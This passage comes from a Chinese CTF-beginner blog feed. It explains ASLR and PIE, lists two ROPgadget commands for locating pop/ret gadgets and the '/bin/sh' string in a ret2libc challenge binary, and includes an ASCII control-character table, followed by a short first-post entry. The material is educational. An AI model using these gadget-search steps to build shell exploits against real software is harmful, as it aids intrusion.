会随机化进程内存布局的关键区域的位置，例如可执行文件的基址、堆栈、堆和库的位置。</li><li><strong>防止利用漏洞</strong>：ASLR 的主要目的是减少依赖于已知内存地址的攻击，如缓冲区溢出、返回到库函数攻击等。</li><li><strong>实现方式</strong>：ASLR 由操作系统内核实现，通常对应用程序是透明的。但是，为了有效利用 ASLR，应用程序和系统库需要编译为位置无关代码（Position Independent Code，PIC）。</li><li><strong>兼容性问题</strong>：虽然 ASLR 可以提高安全性，但有时也会导致一些假设地址不变的程序出现问题。开发者需要确保他们的程序能够适应随机化的地址。</li><li><strong>绕过技术</strong>：尽管 ASLR 非常有效，但它并非万无一失。攻击者已经开发出了绕过 ASLR 的技术，比如通过暴力破解内存地址或使用信息泄露来发现进程的基址。</li><li><strong>可配置性</strong>：在许多系统中，ASLR 可以根据需要进行配置甚至禁用。例如，在 Linux 系统中，<code>/proc/sys/kernel/randomize_va_space</code> 文件用于控制 ASLR 的使用。</li><li><strong>栈保护和DEP</strong>：ASLR 通常与其他安全机制如栈保护和数据执行保护（Data Execution Prevention，DEP）一起使用，形成对攻击的更全面的防御。</li></ol><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>简单来说pie就是指硬盘到可执行文件的映射 如果no pie那么映射就没有随机化</p><p>PIE代表“位置独立可执行文件”（Position Independent Executable）。这是一种编译选项，可以使得生成的可执行文件在内存中的加载位置可以变化，而不是固定的。位置独立的代码（PIC）通常用于共享库（shared libraries），以便库可以被加载到任何内存地址，而不需要额外的重定位开销。PIE将这一概念扩展到了整个可执行文件。</p><p>启用PIE的主要优点是提高了安全性，特别是与地址空间布局随机化（ASLR）一起使用时。ASLR可以随机化进程的内存布局，但如果可执行文件不是位置独立的，那么它的代码段通常会被加载到内存中的固定地址。这可能会使得某些类型的攻击（如基于内存地址的攻击）更容易执行。PIE使得整个可执行文件可以被加载到随机的地址，从而增加了攻击者成功利用内存漏洞的难度。</p><p>以下是PIE的一些关键特性：</p><ol><li><strong>内存随机化</strong>：PIE允许操作系统在每次运行程序时将其加载到内存中的随机位置，这增加了攻击者预测程序内存布局的难度。</li><li><strong>与ASLR的结合</strong>：PIE是ASLR有效的关键组成部分。没有PIE，ASLR对于可执行文件的代码段的随机化就不会那么有效。</li><li><strong>性能开销</strong>：尽管现代处理器和操作系统已经对此进行了优化，但位置独立的代码可能会引入轻微的性能开销，因为它需要在运行时进行额外的地址计算。</li><li><strong>链接选项</strong>：在GCC中，可以通过添加<code>-fPIE</code>（用于编译）和<code>-pie</code>（用于链接）选项来生成PIE。</li></ol><p>例如，使用以下命令编译和链接一个程序：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIE -pie -o my_program my_program.c</span><br></pre></td></tr></table></figure><ol><li><strong>广泛支持</strong>：大多数现代操作系统和编译器都支持PIE，使其成为提高软件安全性的标准做法。</li></ol><p>总的来说，PIE是现代软件安全的重要特性，它与ASLR等技术结合，有效地提高了操作系统的抵抗远程代码执行攻击的能力。</p><h5 id="ASLR影响的是堆-共享库-栈等等"><a href="#ASLR影响的是堆-共享库-栈等等" class="headerlink" title="ASLR影响的是堆,共享库,栈等等"></a>ASLR影响的是堆,共享库,栈等等</h5><h5 id="PIE影响的是ELF本身的映射"><a href="#PIE影响的是ELF本身的映射" class="headerlink" title="PIE影响的是ELF本身的映射"></a>PIE影响的是ELF本身的映射</h5><h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;eax&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2libc1 --<span class="built_in">string</span> <span class="string">&#x27;/bin/sh&#x27;</span> </span><br></pre></td></tr></table></figure><h3 id="一些ASCII码对应的字符"><a href="#一些ASCII码对应的字符" class="headerlink" title="一些ASCII码对应的字符"></a>一些ASCII码对应的字符</h3><p>可能有人觉得没用，我觉得在gdb的时候还是有一点点用的，因此写下，可能也是本人水平低下</p><table><thead><tr><th align="left">十进制</th><th align="left">十六进制</th><th align="left">控制字符</th><th align="left">转义字符</th><th align="left">说明</th><th align="left">Ctrl + 下列字母</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">00</td><td align="left">NUL</td><td align="left">\0</td><td align="left">Null character(空字符)</td><td align="left">@</td></tr><tr><td align="left">1</td><td align="left">01</td><td align="left">SOH</td><td align="left"></td><td align="left">Start of Header(标题开始)</td><td align="left">A</td></tr><tr><td align="left">2</td><td align="left">02</td><td align="left">STX</td><td align="left"></td><td align="left">Start of Text(正文开始)</td><td align="left">B</td></tr><tr><td align="left">3</td><td align="left">03</td><td align="left">ETX</td><td align="left"></td><td align="left">End of Text(正文结束)</td><td align="left">C</td></tr><tr><td align="left">4</td><td align="left">04</td><td align="left">EOT</td><td align="left"></td><td align="left">End of Transmission(传输结束)</td><td align="left">D</td></tr><tr><td align="left">5</td><td align="left">05</td><td align="left">ENQ</td><td align="left"></td><td align="left">Enquiry(请求)</td><td align="left">E</td></tr><tr><td align="left">6</td><td align="left">06</td><td align="left">ACK</td><td align="left"></td><td align="left">Acknowledgment(收到通知&#x2F;响应)</td><td align="left">F</td></tr><tr><td align="left">7</td><td align="left">07</td><td align="left">BEL</td><td align="left">\a</td><td align="left">Bell(响铃)</td><td align="left">G</td></tr><tr><td align="left">8</td><td align="left">08</td><td align="left">BS</td><td align="left">\b</td><td align="left">Backspace(退格)</td><td align="left">H</td></tr><tr><td align="left">9</td><td align="left">09</td><td align="left">HT</td><td align="left">\t</td><td align="left">Horizontal Tab(水平制表符)</td><td align="left">I</td></tr><tr><td align="left">10</td><td align="left">0A</td><td align="left">LF</td><td align="left">\n</td><td align="left">Line feed(换行键)</td><td align="left">J</td></tr><tr><td align="left">11</td><td align="left">0B</td><td align="left">VT</td><td align="left">\v</td><td align="left">Vertical Tab(垂直制表符)</td><td align="left">K</td></tr><tr><td align="left">12</td><td align="left">0C</td><td align="left">FF</td><td align="left">\f</td><td align="left">Form feed(换页键)</td><td align="left">L</td></tr><tr><td align="left">13</td><td align="left">0D</td><td align="left">CR</td><td align="left">\r</td><td align="left">Carriage return(回车键)</td><td align="left">M</td></tr><tr><td align="left">14</td><td align="left">0E</td><td align="left">SO</td><td align="left"></td><td align="left">Shift Out(不用切换)</td><td align="left">N</td></tr><tr><td align="left">15</td><td align="left">0F</td><td align="left">SI</td><td align="left"></td><td align="left">Shift In(启用切换)</td><td align="left">O</td></tr><tr><td align="left">16</td><td align="left">10</td><td align="left">DLE</td><td align="left"></td><td align="left">Data Link Escape(数据链路转义)</td><td align="left">P</td></tr><tr><td align="left">17</td><td align="left">11</td><td align="left">DC1</td><td align="left"></td><td align="left">Device Control 1(设备控制1) &#x2F;XON(Transmit On)</td><td align="left">Q</td></tr><tr><td align="left">18</td><td align="left">12</td><td align="left">DC2</td><td align="left"></td><td align="left">Device Control 2(设备控制2)</td><td align="left">R</td></tr><tr><td align="left">19</td><td align="left">13</td><td align="left">DC3</td><td align="left"></td><td align="left">Device Control 3(设备控制3) &#x2F;XOFF(Transmit Off)</td><td align="left">S</td></tr><tr><td align="left">20</td><td align="left">14</td><td align="left">DC4</td><td align="left"></td><td align="left">Device Control 4(设备控制4)</td><td align="left">T</td></tr><tr><td align="left">21</td><td align="left">15</td><td align="left">NAK</td><td align="left"></td><td align="left">Negative Acknowledgement(拒绝接收&#x2F;无响应)</td><td align="left">U</td></tr><tr><td align="left">22</td><td align="left">16</td><td align="left">SYN</td><td align="left"></td><td align="left">Synchronous Idle(同步空闲)</td><td align="left">V</td></tr><tr><td align="left">23</td><td align="left">17</td><td align="left">ETB</td><td align="left"></td><td align="left">End of Trans the Block(传输块结束)</td><td align="left">W</td></tr><tr><td align="left">24</td><td align="left">18</td><td align="left">CAN</td><td align="left"></td><td align="left">Cancel(取消)</td><td align="left">X</td></tr><tr><td align="left">25</td><td align="left">19</td><td align="left">EM</td><td align="left"></td><td align="left">End of Medium(已到介质末端&#x2F;介质存储已满)</td><td align="left">Y</td></tr><tr><td align="left">26</td><td align="left">1A</td><td align="left">SUB</td><td align="left"></td><td align="left">Substitute(替补&#x2F;替换)</td><td align="left">Z</td></tr><tr><td align="left">27</td><td align="left">1B</td><td align="left">ESC</td><td align="left">\e</td><td align="left">Escape(溢出&#x2F;逃离&#x2F;取消)</td><td align="left">[</td></tr><tr><td align="left">28</td><td align="left">1C</td><td align="left">FS</td><td align="left"></td><td align="left">File Separator(文件分割符)</td><td align="left">\</td></tr><tr><td align="left">29</td><td align="left">1D</td><td align="left">GS</td><td align="left"></td><td align="left">Group Separator(分组符)</td><td align="left">]</td></tr><tr><td align="left">30</td><td align="left">1E</td><td align="left">RS</td><td align="left"></td><td align="left">Record Separator(记录分隔符)</td><td align="left">^</td></tr><tr><td align="left">31</td><td align="left">1F</td><td align="left">US</td><td align="left"></td><td align="left">Unit Separator(单元分隔符)</td><td align="left">_</td></tr><tr><td align="left">32</td><td align="left">20</td><td align="left">SP</td><td align="left"></td><td align="left">White space</td><td align="left">[Space]</td></tr><tr><td align="left">127</td><td align="left">7F</td><td align="left">DEL</td><td align="left"></td><td align="left">Delete(删除)</td><td align="left">?</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PWN小知识&quot;&gt;&lt;a href=&quot;#PWN小知识&quot; class=&quot;headerlink&quot; title=&quot;PWN小知识&quot;&gt;&lt;/a&gt;PWN小知识&lt;/h2&gt;&lt;p&gt;由于pwn相关的一些专业术语新手入门时不易了解(我也是)，因此在此写下零零碎碎(&lt;strong&gt;有错误请在评</summary>
      
    
    
    
    <category term="Pwn知识" scheme="http://s1nec-1o.github.io/categories/Pwn%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>My first blog</title>
    <link href="http://s1nec-1o.github.io/2024/01/16/My-first-blog/"/>
    <id>http://s1nec-1o.github.io/2024/01/16/My-first-blog/</id>
    <published>2024-01-16T05:10:35.000Z</published>
    <updated>2024-04-28T09:08:40.819Z</updated>
    
    <content type="html"><![CDATA[<h4 id="这是我的第一篇博客"><a href="#这是我的第一篇博客" class="headerlink" title="这是我的第一篇博客"></a>这是我的第一篇博客</h4><p>以后我的博客将会记录我在技术学习以及研究路上的记录和坎坷</p><p>也会记录我的学习成果，做题记录等等</p><p>希望我的路途能走的越远越好。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;这是我的第一篇博客&quot;&gt;&lt;a href=&quot;#这是我的第一篇博客&quot; class=&quot;headerlink&quot; title=&quot;这是我的第一篇博客&quot;&gt;&lt;/a&gt;这是我的第一篇博客&lt;/h4&gt;&lt;p&gt;以后我的博客将会记录我在技术学习以及研究路上的记录和坎坷&lt;/p&gt;
&lt;p&gt;也会记录我的</summary>
      
    
    
    
    <category term="总结" scheme="http://s1nec-1o.github.io/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="杂谈" scheme="http://s1nec-1o.github.io/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
</feed>
